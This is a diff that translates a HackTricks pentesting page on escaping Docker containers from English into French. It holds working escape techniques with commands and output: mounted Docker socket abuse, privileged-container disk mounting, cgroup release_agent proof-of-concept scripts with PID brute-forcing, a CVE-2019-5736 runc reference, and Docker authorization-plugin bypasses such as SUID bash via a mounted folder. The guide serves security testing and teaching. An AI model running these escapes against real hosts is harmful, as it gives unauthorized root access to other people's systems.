@@ -1,92 +1,80 @@
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 
-# What is a container
+# Qu'est-ce qu'un conteneur
 
-In summary, it's an **isolated** **process** via **cgroups** (what the process can use, like CPU and RAM) and **namespaces** (what the process can see, like directories or other processes):
-
+En résumé, c'est un **processus isolé** via **cgroups** (ce que le processus peut utiliser, comme le CPU et la RAM) et des **espaces de noms** (ce que le processus peut voir, comme les répertoires ou les autres processus) :
 ```bash
 docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
 ps -ef | grep 1234 #Get info about the sleep process
 ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
 ```
+# Socket Docker monté
 
-# Mounted docker socket
-
-If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
-This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.
-
+Si vous trouvez que le **socket Docker est monté** à l'intérieur du conteneur Docker, vous pourrez vous échapper.\
+Cela se produit généralement dans les conteneurs Docker qui, pour une raison quelconque, doivent se connecter au démon Docker pour effectuer des actions.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-
-In this case you can use regular docker commands to communicate with the docker daemon:
-
+Dans ce cas, vous pouvez utiliser les commandes docker régulières pour communiquer avec le démon docker:
 ```bash
 #List images to use one
 docker images
 #Run the image mounting the host disk and chroot on it
 docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
 ```
-
 {% hint style="info" %}
-In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**
+Dans le cas où le **socket docker est dans un emplacement inattendu**, vous pouvez toujours communiquer avec lui en utilisant la commande **`docker`** avec le paramètre **`-H unix:///path/to/docker.sock`**
 {% endhint %}
 
-# Container Capabilities
+# Capacités du conteneur
 
-You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**
+Vous devez vérifier les capacités du conteneur, s'il possède l'une des capacités suivantes, vous pourriez être en mesure de vous échapper : **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**
 
-You can check currently container capabilities with:
-
+Vous pouvez vérifier les capacités actuelles du conteneur avec :
 ```bash
 capsh --print
 ```
-
-In the following page you can **learn more about linux capabilities** and how to abuse them:
+Sur la page suivante, vous pouvez **en savoir plus sur les capacités de Linux** et comment les abuser :
 
 {% content-ref url="linux-capabilities.md" %}
 [linux-capabilities.md](linux-capabilities.md)
 {% endcontent-ref %}
 
-# `--privileged` flag
+# Drapeau `--privileged`
 
-The --privileged flag allows the container to have access to the host devices.
+Le drapeau --privileged permet au conteneur d'avoir accès aux périphériques de l'hôte.
 
-## I own Root
+## Je suis propriétaire de Root
 
-Well configured docker containers won't allow command like **fdisk -l**. However on missconfigured docker command where the flag --privileged is specified, it is possible to get the privileges to see the host drive.
+Les conteneurs Docker bien configurés n'autorisent pas les commandes telles que **fdisk -l**. Cependant, dans une commande Docker mal configurée où le drapeau --privileged est spécifié, il est possible d'obtenir les privilèges pour voir le disque de l'hôte.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-So to take over the host machine, it is trivial:
-
+Ainsi, pour prendre le contrôle de la machine hôte, c'est trivial :
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
+Et voilà ! Vous pouvez maintenant accéder au système de fichiers de l'hôte car il est monté dans le dossier `/mnt/hola`.
 
-And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola `folder.
-
-{% code title="Initial PoC" %}
+{% code title="PoC initial" %}
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -102,7 +90,7 @@ sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
 {% endcode %}
 
-{% code title="Second PoC" %}
+{% code title="Deuxième PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -130,35 +118,34 @@ head /output
 ```
 {% endcode %}
 
-The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.
+Le drapeau `--privileged` introduit des problèmes de sécurité importants et l'exploit repose sur le lancement d'un conteneur Docker avec ce drapeau activé. Lorsque ce drapeau est utilisé, les conteneurs ont un accès complet à tous les périphériques et ne sont pas soumis aux restrictions de seccomp, AppArmor et des capacités Linux.
 
-In fact, `--privileged` provides far more permissions than needed to escape a docker container via this method. In reality, the “only” requirements are:
+En fait, `--privileged` fournit beaucoup plus de permissions que nécessaire pour s'échapper d'un conteneur Docker via cette méthode. En réalité, les seuls prérequis sont :
 
-1. We must be running as root inside the container
-2. The container must be run with the `SYS_ADMIN` Linux capability
-3. The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
-4. The cgroup v1 virtual filesystem must be mounted read-write inside the container
+1. Nous devons être en train d'exécuter en tant que root à l'intérieur du conteneur
+2. Le conteneur doit être exécuté avec la capacité Linux `SYS_ADMIN`
+3. Le conteneur doit manquer d'un profil AppArmor, ou autrement permettre l'appel système `mount`
+4. Le système de fichiers virtuel cgroup v1 doit être monté en lecture-écriture à l'intérieur du conteneur
 
-The `SYS_ADMIN` capability allows a container to perform the mount syscall (see [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker starts containers with a restricted set of capabilities](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) by default and does not enable the `SYS_ADMIN` capability due to the security risks of doing so.
+La capacité `SYS_ADMIN` permet à un conteneur d'exécuter l'appel système `mount` (voir [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker démarre les conteneurs avec un ensemble restreint de capacités](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) par défaut et n'active pas la capacité `SYS_ADMIN` en raison des risques de sécurité que cela implique.
 
-Further, Docker [starts containers with the `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) policy by default, which [prevents the use of the mount syscall](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) even when the container is run with `SYS_ADMIN`.
+De plus, Docker [démarre les conteneurs avec la politique AppArmor par défaut `docker-default`](https://docs.docker.com/engine/security/apparmor/#understand-the-policies), qui [empêche l'utilisation de l'appel système `mount`](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) même lorsque le conteneur est exécuté avec `SYS_ADMIN`.
 
-A container would be vulnerable to this technique if run with the flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`
+Un conteneur serait vulnérable à cette technique s'il est exécuté avec les drapeaux : `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`
 
-## Breaking down the proof of concept
+## Analyse du proof of concept
 
-Now that we understand the requirements to use this technique and have refined the proof of concept exploit, let’s walk through it line-by-line to demonstrate how it works.
+Maintenant que nous comprenons les prérequis pour utiliser cette technique et que nous avons affiné l'exploit de proof of concept, parcourons-le ligne par ligne pour démontrer comment il fonctionne.
 
-To trigger this exploit we need a cgroup where we can create a `release_agent` file and trigger `release_agent` invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.
+Pour déclencher cette exploitation, nous avons besoin d'un cgroup où nous pouvons créer un fichier `release_agent` et déclencher l'invocation de `release_agent` en tuant tous les processus dans le cgroup. Le moyen le plus simple d'y parvenir est de monter un contrôleur cgroup et de créer un cgroup enfant.
 
-To do that, we create a `/tmp/cgrp` directory, mount the [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup controller and create a child cgroup (named “x” for the purposes of this example). While every cgroup controller has not been tested, this technique should work with the majority of cgroup controllers.
+Pour ce faire, nous créons un répertoire `/tmp/cgrp`, montons le contrôleur cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) et créons un cgroup enfant (nommé "x" à des fins d'exemple). Bien que tous les contrôleurs cgroup n'aient pas été testés, cette technique devrait fonctionner avec la majorité des contrôleurs cgroup.
 
-If you’re following along and get “mount: /tmp/cgrp: special device cgroup does not exist”, it’s because your setup doesn’t have the RDMA cgroup controller. Change `rdma` to `memory` to fix it. We’re using RDMA because the original PoC was only designed to work with it.
+Si vous suivez et obtenez "mount: /tmp/cgrp: special device cgroup does not exist", c'est parce que votre configuration n'a pas le contrôleur cgroup RDMA. Changez `rdma` en `memory` pour le corriger. Nous utilisons RDMA car le PoC original a été conçu pour fonctionner uniquement avec celui-ci.
 
-Note that cgroup controllers are global resources that can be mounted multiple times with different permissions and the changes rendered in one mount will apply to another.
+Notez que les contrôleurs cgroup sont des ressources globales qui peuvent être montées plusieurs fois avec des autorisations différentes et les modifications apportées à un montage s'appliqueront à un autre.
 
-We can see the “x” child cgroup creation and its directory listing below.
-
+Nous pouvons voir ci-dessous la création du cgroup enfant "x" et sa liste de répertoires.
 ```
 root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 root@b11cf9eab4fd:/# ls /tmp/cgrp/
@@ -166,28 +153,22 @@ cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  re
 root@b11cf9eab4fd:/# ls /tmp/cgrp/x
 cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
 ```
+Ensuite, nous activons les notifications cgroup lors de la libération du cgroup "x" en écrivant un 1 dans son fichier `notify_on_release`. Nous définissons également l'agent de libération du cgroup RDMA pour exécuter un script `/cmd` - que nous créerons plus tard dans le conteneur - en écrivant le chemin du script `/cmd` sur l'hôte dans le fichier `release_agent`. Pour ce faire, nous récupérons le chemin du conteneur sur l'hôte à partir du fichier `/etc/mtab`.
 
-Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its `notify_on_release` file. We also set the RDMA cgroup release agent to execute a `/cmd` script — which we will later create in the container — by writing the `/cmd` script path on the host to the `release_agent` file. To do it, we’ll grab the container’s path on the host from the `/etc/mtab` file.
+Les fichiers que nous ajoutons ou modifions dans le conteneur sont présents sur l'hôte, et il est possible de les modifier à partir des deux mondes : le chemin dans le conteneur et leur chemin sur l'hôte.
 
-The files we add or modify in the container are present on the host, and it is possible to modify them from both worlds: the path in the container and their path on the host.
-
-Those operations can be seen below:
-
+Ces opérations peuvent être vues ci-dessous :
 ```
 root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
 root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-
-Note the path to the `/cmd` script, which we are going to create on the host:
-
+Notez le chemin d'accès au script `/cmd` que nous allons créer sur l'hôte :
 ```
 root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
 /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
 ```
-
-Now, we create the `/cmd` script such that it will execute the `ps aux` command and save its output into `/output` on the container by specifying the full path of the output file on the host. At the end, we also print the `/cmd` script to see its contents:
-
+Maintenant, nous créons le script `/cmd` de sorte qu'il exécute la commande `ps aux` et enregistre sa sortie dans `/output` sur le conteneur en spécifiant le chemin complet du fichier de sortie sur l'hôte. À la fin, nous imprimons également le contenu du script `/cmd` pour voir son contenu :
 ```
 root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
 root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
@@ -196,9 +177,7 @@ root@b11cf9eab4fd:/# cat /cmd
 #!/bin/sh
 ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
 ```
-
-Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a `/bin/sh` process and writing its PID to the `cgroup.procs` file in “x” child cgroup directory, the script on the host will execute after `/bin/sh` exits. The output of `ps aux` performed on the host is then saved to the `/output` file inside the container:
-
+Enfin, nous pouvons exécuter l'attaque en créant un processus qui se termine immédiatement à l'intérieur du sous-cgroupe "x". En créant un processus `/bin/sh` et en écrivant son PID dans le fichier `cgroup.procs` dans le répertoire du sous-cgroupe "x", le script sur l'hôte s'exécutera après la sortie de `/bin/sh`. La sortie de `ps aux` effectuée sur l'hôte est ensuite enregistrée dans le fichier `/output` à l'intérieur du conteneur :
 ```
 root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 root@b11cf9eab4fd:/# head /output
@@ -213,41 +192,35 @@ root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
 root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
 root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
 ```
+# Drapeau `--privileged` v2
 
-# `--privileged` flag v2
-
-The previous PoCs work fine when the container is configured with a storage-driver which exposes the full host path of the mount point, for example `overlayfs`, however I recently came across a couple of configurations which did not obviously disclose the host file system mount point.
+Les PoCs précédents fonctionnent bien lorsque le conteneur est configuré avec un pilote de stockage qui expose le chemin d'accès complet de l'hôte du point de montage, par exemple `overlayfs`. Cependant, j'ai récemment rencontré quelques configurations qui ne divulguent pas évidemment le point de montage du système de fichiers hôte.
 
 ## Kata Containers
-
 ```
 root@container:~$ head -1 /etc/mtab
 kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
 ```
+Par défaut, [Kata Containers](https://katacontainers.io) monte le système de fichiers racine d'un conteneur sur `9pfs`. Cela ne divulgue aucune information sur l'emplacement du système de fichiers du conteneur dans la machine virtuelle Kata Containers.
 
-[Kata Containers](https://katacontainers.io) by default mounts the root fs of a container over `9pfs`. This discloses no information about the location of the container file system in the Kata Containers Virtual Machine.
-
-\* More on Kata Containers in a future blog post.
+\* Plus d'informations sur Kata Containers dans un prochain article de blog.
 
 ## Device Mapper
-
 ```
 root@container:~$ head -1 /etc/mtab
 /dev/sdc / ext4 rw,relatime,stripe=384 0 0
 ```
+J'ai vu un conteneur avec ce montage racine dans un environnement en direct, je crois que le conteneur fonctionnait avec une configuration de pilote de stockage `devicemapper` spécifique, mais à ce stade, je n'ai pas été en mesure de reproduire ce comportement dans un environnement de test.
 
-I saw a container with this root mount in a live environment, I believe the container was running with a specific `devicemapper` storage-driver configuration, but at this point I have been unable to replicate this behaviour in a test environment.
+## Une alternative PoC
 
-## An Alternative PoC
+Évidemment, dans ces cas, il n'y a pas suffisamment d'informations pour identifier le chemin des fichiers de conteneurs sur le système de fichiers hôte, donc le PoC de Felix ne peut pas être utilisé tel quel. Cependant, nous pouvons toujours exécuter cette attaque avec un peu d'ingéniosité.
 
-Obviously in these cases there is not enough information to identify the path of container files on the host file system, so Felix’s PoC cannot be used as is. However, we can still execute this attack with a little ingenuity.
+La seule information clé requise est le chemin complet, relatif à l'hôte de conteneur, d'un fichier à exécuter dans le conteneur. Sans être en mesure de le discerner à partir des points de montage dans le conteneur, nous devons chercher ailleurs.
 
-The one key piece of information required is the full path, relative to the container host, of a file to execute within the container. Without being able to discern this from mount points within the container we have to look elsewhere.
+### Proc à la rescousse <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>
 
-### Proc to the Rescue <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>
-
-The Linux `/proc` pseudo-filesystem exposes kernel process data structures for all processes running on a system, including those running in different namespaces, for example within a container. This can be shown by running a command in a container and accessing the `/proc` directory of the process on the host:Container
-
+Le pseudo-système de fichiers `/proc` de Linux expose les structures de données de processus du noyau pour tous les processus en cours d'exécution sur un système, y compris ceux s'exécutant dans différents espaces de noms, par exemple dans un conteneur. Cela peut être démontré en exécutant une commande dans un conteneur et en accédant au répertoire `/proc` du processus sur l'hôte : Conteneur.
 ```bash
 root@container:~$ sleep 100
 ```
@@ -271,17 +244,15 @@ lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
 -rw-r--r--   1 root root 0 Nov 19 10:29 sched
 ...
 ```
-
-_As an aside, the `/proc/<pid>/root` data structure is one that confused me for a very long time, I could never understand why having a symbolic link to `/` was useful, until I read the actual definition in the man pages:_
+En passant, la structure de données `/proc/<pid>/root` m'a longtemps laissé perplexe, je ne comprenais pas pourquoi avoir un lien symbolique vers `/` était utile, jusqu'à ce que je lise la définition réelle dans les pages de manuel :
 
 > /proc/\[pid]/root
 >
-> UNIX and Linux support the idea of a per-process root of the filesystem, set by the chroot(2) system call. This file is a symbolic link that points to the process’s root directory, and behaves in the same way as exe, and fd/\*.
+> UNIX et Linux supportent l'idée d'une racine de système de fichiers par processus, définie par l'appel système chroot(2). Ce fichier est un lien symbolique qui pointe vers le répertoire racine du processus, et se comporte de la même manière que exe et fd/\*.
 >
-> Note however that this file is not merely a symbolic link. It provides the same view of the filesystem (including namespaces and the set of per-process mounts) as the process itself.
+> Notez cependant que ce fichier n'est pas simplement un lien symbolique. Il fournit la même vue du système de fichiers (y compris les espaces de noms et l'ensemble des montages par processus) que le processus lui-même.
 
-The `/proc/<pid>/root` symbolic link can be used as a host relative path to any file within a container:Container
-
+Le lien symbolique `/proc/<pid>/root` peut être utilisé comme un chemin relatif à l'hôte vers n'importe quel fichier dans un conteneur : Conteneur
 ```bash
 root@container:~$ echo findme > /findme
 root@container:~$ sleep 100
@@ -291,20 +262,16 @@ root@container:~$ sleep 100
 root@host:~$ cat /proc/`pidof sleep`/root/findme
 findme
 ```
+Cela change la condition requise pour l'attaque, passant de la connaissance du chemin complet, relatif à l'hôte du conteneur, d'un fichier à l'intérieur du conteneur, à la connaissance du pid de _n'importe quel_ processus s'exécutant dans le conteneur.
 
-This changes the requirement for the attack from knowing the full path, relative to the container host, of a file within the container, to knowing the pid of _any_ process running in the container.
+### Bashage de Pid <a href="pid-bashing" id="pid-bashing"></a>
 
-### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>
-
-This is actually the easy part, process ids in Linux are numerical and assigned sequentially. The `init` process is assigned process id `1` and all subsequent processes are assigned incremental ids. To identify the host process id of a process within a container, a brute force incremental search can be used:Container
-
+C'est en fait la partie facile, les identifiants de processus dans Linux sont numériques et attribués séquentiellement. Le processus `init` est attribué l'identifiant de processus `1` et tous les processus suivants sont attribués des identifiants incrémentaux. Pour identifier l'identifiant de processus de l'hôte d'un processus à l'intérieur d'un conteneur, une recherche incrémentale par force brute peut être utilisée : Container
 ```
 root@container:~$ echo findme > /findme
 root@container:~$ sleep 100
 ```
-
-Host
-
+Hôte
 ```bash
 root@host:~$ COUNTER=1
 root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
@@ -313,15 +280,13 @@ root@host:~$ echo ${COUNTER}
 root@host:~$ cat /proc/${COUNTER}/root/findme
 findme
 ```
+### Mettre le tout ensemble <a href="putting-it-all-together" id="putting-it-all-together"></a>
 
-### Putting it All Together <a href="putting-it-all-together" id="putting-it-all-together"></a>
+Pour mener à bien cette attaque, la technique de force brute peut être utilisée pour deviner le pid du chemin `/proc/<pid>/root/payload.sh`, avec chaque itération écrivant le chemin pid deviné dans le fichier `release_agent` des cgroups, déclenchant le `release_agent`, et vérifiant si un fichier de sortie est créé.
 
-To complete this attack the brute force technique can be used to guess the pid for the path `/proc/<pid>/root/payload.sh`, with each iteration writing the guessed pid path to the cgroups `release_agent` file, triggering the `release_agent`, and seeing if an output file is created.
+Le seul inconvénient de cette technique est qu'elle n'est en aucun cas subtile et peut augmenter considérablement le nombre de pid. Comme aucun processus de longue durée n'est maintenu en cours d'exécution, cela ne devrait pas causer de problèmes de fiabilité, mais ne me citez pas là-dessus.
 
-The only caveat with this technique is it is in no way shape or form subtle, and can increase the pid count very high. As no long running processes are kept running this _should_ not cause reliability issues, but don’t quote me on that.
-
-The below PoC implements these techniques to provide a more generic attack than first presented in Felix’s original PoC for escaping a privileged container using the cgroups `release_agent` functionality:
-
+Le PoC ci-dessous met en œuvre ces techniques pour fournir une attaque plus générique que celle présentée initialement dans le PoC original de Felix pour s'échapper d'un conteneur privilégié en utilisant la fonctionnalité `release_agent` des cgroups :
 ```bash
 #!/bin/sh
 
@@ -381,9 +346,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-
-Executing the PoC within a privileged container should provide output similar to:
-
+L'exécution du PoC dans un conteneur privilégié devrait fournir une sortie similaire à:
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -411,48 +374,42 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
+# Exploit Runc (CVE-2019-5736)
 
-# Runc exploit (CVE-2019-5736)
+Si vous pouvez exécuter `docker exec` en tant que root (probablement avec sudo), vous pouvez essayer d'escalader les privilèges en sortant d'un conteneur en exploitant CVE-2019-5736 (exploit [ici](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Cette technique va essentiellement **écraser** le binaire _**/bin/sh**_ de l'**hôte** **à partir d'un conteneur**, de sorte que toute personne exécutant docker exec peut déclencher la charge utile.
 
-In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.
+Modifiez la charge utile en conséquence et compilez main.go avec `go build main.go`. Le binaire résultant doit être placé dans le conteneur Docker pour l'exécution.\
+Lors de l'exécution, dès qu'il affiche `[+] Overwritten /bin/sh successfully`, vous devez exécuter ce qui suit depuis la machine hôte :
 
-Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.\
-Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:
+`docker exec -it <nom-du-conteneur> /bin/sh`
 
-`docker exec -it <container-name> /bin/sh`
+Cela déclenchera la charge utile qui est présente dans le fichier main.go.
 
-This will trigger the payload which is present in the main.go file.
+Pour plus d'informations : [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
-For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
+# Contourner le plugin d'authentification Docker
 
-# Docker Auth Plugin Bypass
+Dans certains cas, l'administrateur système peut installer des plugins pour Docker afin d'empêcher les utilisateurs à faible privilège d'interagir avec Docker sans pouvoir escalader les privilèges.
 
-In some occasions, the sysadmin may install some plugins to docker to avoid low privilege users to interact with docker without being able to escalate privileges.
+## `run --privileged` interdit
 
-## disallowed `run --privileged`
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+Dans ce cas, l'administrateur système **interdit aux utilisateurs de monter des volumes et d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner des capacités supplémentaires au conteneur :
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+Cependant, un utilisateur peut **créer un shell à l'intérieur du conteneur en cours d'exécution et lui donner des privilèges supplémentaires**:
 ```bash
 docker run -d --security-opt "seccomp=unconfined" ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
 docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
 ```
+Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des techniques précédemment discutées et escalader les privilèges à l'intérieur de l'hôte.
 
-Now, the user can escape from the container using any of the previously discussed techniques and escalate privileges inside the host.
+## Monter un dossier inscriptible
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+Dans ce cas, l'administrateur système **a interdit aux utilisateurs d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner des capacités supplémentaires au conteneur, et il a seulement autorisé le montage du dossier `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -461,20 +418,18 @@ docker container> chmod u+s /host/bash
 host> /tmp/bash
  -p #This will give you a shell as root
 ```
-
 {% hint style="info" %}
-Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+Notez que vous ne pouvez peut-être pas monter le dossier `/tmp`, mais vous pouvez monter un **dossier différent accessible en écriture**. Vous pouvez trouver des répertoires accessibles en écriture en utilisant la commande : `find / -writable -type d 2>/dev/null`
 
-**Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+**Notez que tous les répertoires d'une machine Linux ne prendront pas en charge le bit suid !** Pour vérifier quels répertoires prennent en charge le bit suid, exécutez la commande `mount | grep -v "nosuid"`. Par exemple, généralement `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` et `/var/lib/lxcfs` ne prennent pas en charge le bit suid.
 
-Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+Notez également que si vous pouvez **monter `/etc`** ou tout autre dossier **contenant des fichiers de configuration**, vous pouvez les modifier depuis le conteneur Docker en tant que root pour **les exploiter sur l'hôte** et escalader les privilèges (peut-être en modifiant `/etc/shadow`).
 {% endhint %}
 
-## Unchecked JSON Structure
+## Structure JSON non vérifiée
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
+Il est possible que lorsque l'administrateur système a configuré le pare-feu Docker, il ait **oublié un paramètre important** de l'API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) comme "**Binds**".\
+Dans l'exemple suivant, il est possible d'exploiter cette mauvaise configuration pour créer et exécuter un conteneur qui monte le dossier racine (/) de l'hôte :
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
